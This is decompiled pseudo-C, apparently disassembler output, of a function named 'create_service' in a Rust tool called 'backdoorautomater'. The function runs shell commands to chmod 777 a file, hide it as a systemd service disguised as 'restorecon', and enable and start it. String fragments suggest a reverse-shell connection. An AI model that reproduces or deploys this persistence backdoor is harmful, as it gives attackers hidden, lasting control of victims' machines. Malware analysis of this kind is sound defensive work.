
  int64_t backdoorautomater::newservice::create_service::h60e36f0974dfe8c1(int64_t* arg1, int64_t* arg2)

{
    backdoorautomater::sanitizer::sanitize_service_exist::hcf34e52a82af7174(arg1);
    int64_t zmm0 = *(arg1 + 8);
    char const* const var_1e8 = "chmod 777 sh-cFailed to execute …";
    int64_t var_1e0 = 0xa;
    int128_t var_248;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_248, &var_1e8, 2, 1, 0);
    int64_t var_238;
    int64_t var_b8 = var_238;
    int128_t var_c8 = var_248;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_1e8, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_1e8, 
            "-cFailed to execute commandsrc/n…"), 
        &var_c8);
    std::process::Command::output::hf2f7777b705db8a9(&var_248);
    int128_t var_288;
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_288, &var_248);
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1e8);
    int64_t var_268;
    size_t var_260;
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_248, var_268, var_260);
    int64_t rax_2;
    uint64_t rdx_4;
    rax_2 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_248);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
        rax_2, rdx_4);
    int64_t var_2d8 = zmm0;
    int128_t var_2e8 = var_1e8;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_248);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2e8);
    int64_t zmm0_3 = *(arg1 + 8);
    var_1e8 = "mv restorecon /etc/systemd/syste…";
    int64_t var_1e0_1 = 3;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_248, &var_1e8, 2, 1, 0);
    int64_t var_d8 = var_238;
    int128_t var_e8 = var_248;
    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_e8, 
        " /etc/systemd/system/restorecono…", 0x15);
    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_e8, arg1[1], arg1[2]);
    std::process::Command::new::hc59b10cf3f1b2ada(&var_1e8, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_1e8, 
            "-cFailed to execute commandsrc/n…"), 
        &var_e8);
    std::process::Command::output::hf2f7777b705db8a9(&var_248);
    int128_t var_2c8;
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2c8, &var_248);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_288);
    int64_t var_298;
    int64_t var_258 = var_298;
    int128_t var_2a8;
    var_268 = var_2a8;
    int128_t var_2b8;
    int128_t var_278 = var_2b8;
    var_288 = var_2c8;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1e8);
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_248, var_268, var_260);
    int64_t rax_7;
    uint64_t rdx_10;
    rax_7 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_248);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
        rax_7, rdx_10);
    var_2b8 = zmm0_3;
    var_2c8 = var_1e8;
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
    int64_t var_2d8_1 = var_2b8;
    var_2e8 = var_2c8;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_248);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2e8);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
        "restoreconokchmod 777 sh-cFailed…", 0xa);
    int64_t var_98 = zmm0_3;
    int128_t var_a8 = var_1e8;
    int64_t var_208;
    
    if (backdoorautomater::sanitizer::sanitize_command_exist::h2a8286a439cabb9a(&var_a8))
    {
        alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_1e8, &data_62a0a0, 2, 1, 0);
        int64_t var_1f8_1 = zmm0_3;
        var_208 = var_1e8;
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_208, arg1[1], 
            arg1[2]);
        std::process::Command::new::hc59b10cf3f1b2ada(&var_1e8, 
            "sh-cFailed to execute commandsrc…");
        std::process::Command::arg::h1a6c514e95e1ad22(
            std::process::Command::arg::ha1bca970e684ecbe(&var_1e8, 
                "-cFailed to execute commandsrc/n…"), 
            &var_208);
        std::process::Command::output::hf2f7777b705db8a9(&var_248);
        core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2c8, &var_248);
        core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_288);
        int64_t var_258_1 = var_298;
        var_268 = var_2a8;
        int128_t var_278_1 = var_2b8;
        var_288 = var_2c8;
        core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1e8);
        alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_248, var_268, var_260);
        int64_t rax_15;
        uint64_t rdx_16;
        rax_15 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_248);
        _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
            rax_15, rdx_16);
        var_2b8 = zmm0_3;
        var_2c8 = var_1e8;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
        int64_t var_2d8_2 = var_2b8;
        var_2e8 = var_2c8;
        core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_248);
        backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2e8);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_208);
    }
    
    char const* const var_f8 = "systemctl daemon-reloadsystemctl…";
    int64_t var_f0 = 0x17;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_1e8, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::hf81cfe9a1d177945(
        std::process::Command::arg::ha1bca970e684ecbe(&var_1e8, 
            "-cFailed to execute commandsrc/n…"), 
        &var_f8);
    std::process::Command::output::hf2f7777b705db8a9(&var_248);
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2c8, &var_248);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_288);
    int64_t var_258_2 = var_298;
    var_268 = var_2a8;
    int128_t var_278_2 = var_2b8;
    var_288 = var_2c8;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1e8);
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_248, var_268, var_260);
    int64_t rax_20;
    uint64_t rdx_21;
    rax_20 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_248);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
        rax_20, rdx_21);
    var_2b8 = zmm0_3;
    var_2c8 = var_1e8;
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
    int64_t var_2d8_3 = var_2b8;
    var_2e8 = var_2c8;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_248);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2e8);
    int64_t zmm0_16 = *(arg1 + 8);
    var_1e8 = "systemctl enable systemctl stop …";
    int64_t var_1e0_2 = 0x11;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_248, &var_1e8, 2, 1, 0);
    int64_t var_78 = var_238;
    int128_t var_88 = var_248;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_1e8, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_1e8, 
            "-cFailed to execute commandsrc/n…"), 
        &var_88);
    std::process::Command::output::hf2f7777b705db8a9(&var_248);
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2c8, &var_248);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_288);
    int64_t var_258_3 = var_298;
    var_268 = var_2a8;
    int128_t var_278_3 = var_2b8;
    var_288 = var_2c8;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1e8);
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_248, var_268, var_260);
    int64_t rax_26;
    uint64_t rdx_26;
    rax_26 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_248);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
        rax_26, rdx_26);
    var_2b8 = zmm0_16;
    var_2c8 = var_1e8;
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
    int64_t var_2d8_4 = var_2b8;
    var_2e8 = var_2c8;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_248);
    backdoorautomater::sanitizer::sanitize_ex_stderr::h2f447f0a04b557e6(&var_2e8);
    var_f8 = "systemctl daemon-reloadsystemctl…";
    int64_t var_f0_1 = 0x17;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_1e8, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::hf81cfe9a1d177945(
        std::process::Command::arg::ha1bca970e684ecbe(&var_1e8, 
            "-cFailed to execute commandsrc/n…"), 
        &var_f8);
    std::process::Command::output::hf2f7777b705db8a9(&var_248);
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2c8, &var_248);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_288);
    int64_t var_258_4 = var_298;
    var_268 = var_2a8;
    int128_t var_278_4 = var_2b8;
    var_288 = var_2c8;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1e8);
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_248, var_268, var_260);
    int64_t rax_31;
    uint64_t rdx_31;
    rax_31 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_248);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
        rax_31, rdx_31);
    var_2b8 = zmm0_16;
    var_2c8 = var_1e8;
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
    int64_t var_2d8_5 = var_2b8;
    var_2e8 = var_2c8;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_248);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2e8);
    int64_t zmm0_24 = *(arg1 + 8);
    var_1e8 = "systemctl stop \nGreat ! Please …";
    int64_t var_1e0_3 = 0xf;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_248, &var_1e8, 2, 1, 0);
    int64_t var_58 = var_238;
    int128_t var_68 = var_248;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_1e8, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_1e8, 
            "-cFailed to execute commandsrc/n…"), 
        &var_68);
    std::process::Command::output::hf2f7777b705db8a9(&var_248);
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2c8, &var_248);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_288);
    int64_t var_258_5 = var_298;
    var_268 = var_2a8;
    int128_t var_278_5 = var_2b8;
    var_288 = var_2c8;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1e8);
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_248, var_268, var_260);
    int64_t rax_37;
    uint64_t rdx_36;
    rax_37 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_248);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
        rax_37, rdx_36);
    var_2b8 = zmm0_24;
    var_2c8 = var_1e8;
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
    int64_t var_2d8_6 = var_2b8;
    var_2e8 = var_2c8;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_248);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2e8);
    int64_t zmm0_29 = *(arg1 + 8);
    var_1e8 = "systemctl start s.connect((v_ip,…";
    int64_t var_1e0_4 = 0x10;
    int64_t var_1d8_4 = zmm0_29;
    int64_t r14_1 = 1;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_248, &var_1e8, 2, 1, 0);
    int64_t var_38 = var_238;
    int128_t var_48 = var_248;
    int64_t var_118 = 0;
    int64_t var_110 = 1;
    int64_t var_108 = 0;
    var_208 = 0;
    int64_t var_200 = 1;
    int64_t var_1f8_2 = 0;
    
    while (true)
    {
        int64_t rax_41;
        uint64_t rdx_37;
        rax_41 = _$LT$alloc..string..String$u20$as$u20$core..ops..index..Index$LT$I$GT$$GT$::index::h1ea7f21b51de2163(r14_1);
        
        if (_$LT$$u5b$A$u5d$$u20$as$u20$core..slice..cmp..SlicePartialEq$LT$B$GT$$GT$::equal::hb48dcd74040cf04f(rax_41, rdx_37, "okchmod 777 sh-cFailed to execut…", 2))
            break;
        
        var_1e8 = &data_62a190;
        int64_t var_1e0_5 = 1;
        var_1d8_4 = 8;
        *var_1d8_4[8] = {0};
        std::io::stdio::_print::h9670eaecb29bc3fc(&var_1e8);
        var_248 = arg2;
        *var_248[8] =
            _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h0123b85e18e164ba;
        var_1e8 = &data_62a1a0;
        int64_t var_1e0_6 = 2;
        int64_t var_1c8_1 = 0;
        var_1d8_4 = &var_248;
        var_1d8_4 = 1;
        std::io::stdio::_print::h9670eaecb29bc3fc(&var_1e8);
        var_1e8 = &data_62a1c0;
        int64_t var_1e0_7 = 1;
        var_1d8_4 = 8;
        *var_1d8_4[8] = {0};
        std::io::stdio::_print::h9670eaecb29bc3fc(&var_1e8);
        std::io::stdio::stdin::h333095a056b9945d();
        var_1e8 = &std::io::stdio::stdin::INSTANCE::h0c8f213e13222558;
        int64_t rax_44;
        int64_t rdx_38;
        rax_44 = std::io::stdio::Stdin::read_line::h820297227bc0cfb0(&var_1e8, &var_118);
        core::result::Result$LT$T$C$E$GT$::expect::h53a72b4a2a5f7bb1(rax_44, rdx_38);
        int64_t rax_45;
        uint64_t rdx_39;
        rax_45 = core::str::_$LT$impl$u20$str$GT$::trim_end_matches::h14d5fe48804a90ed(var_110, 
            var_108, 0xa);
        _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
            rax_45, rdx_39);
        var_248 = var_1e8;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_118);
        var_108 = var_1d8_4;
        var_118 = var_248;
        _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(
            &var_1e8, &var_118);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_208);
        int64_t var_1f8_3 = var_1d8_4;
        var_208 = var_1e8;
        alloc::vec::Vec$LT$T$C$A$GT$::clear::hef16271c1d0d6175(&var_118);
        r14_1 = var_200;
    }
    
    var_1e8 = &data_62a138;
    int64_t var_1e0_8 = 1;
    var_1d8_4 = 8;
    *var_1d8_4[8] = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_1e8);
    std::process::Command::new::hc59b10cf3f1b2ada(&var_1e8, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_1e8, 
            "-cFailed to execute commandsrc/n…"), 
        &var_48);
    std::process::Command::output::hf2f7777b705db8a9(&var_248);
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2c8, &var_248);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_288);
    int64_t var_258_6 = var_298;
    var_268 = var_2a8;
    int128_t var_278_6 = var_2b8;
    var_288 = var_2c8;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1e8);
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_248, var_268, var_260);
    int64_t rax_51;
    uint64_t rdx_44;
    rax_51 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_248);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1e8, 
        rax_51, rdx_44);
    var_2b8 = var_1d8_4;
    var_2c8 = var_1e8;
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
    int64_t var_2d8_7 = var_2b8;
    var_2e8 = var_2c8;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_248);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2e8);
    var_1e8 = &data_62a160;
    int64_t var_1e0_9 = 1;
    var_1d8_4 = 8;
    *var_1d8_4[8] = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_1e8);
    var_248 = arg2;
    *var_248[8] =
        _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h0123b85e18e164ba;
    var_1e8 = &data_62a170;
    int64_t var_1e0_10 = 2;
    int64_t var_1c8_2 = 0;
    var_1d8_4 = &var_248;
    var_1d8_4 = 1;
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_1e8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_208);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_118);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_68);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_88);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_a8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_e8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_288);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_c8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    return core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
}
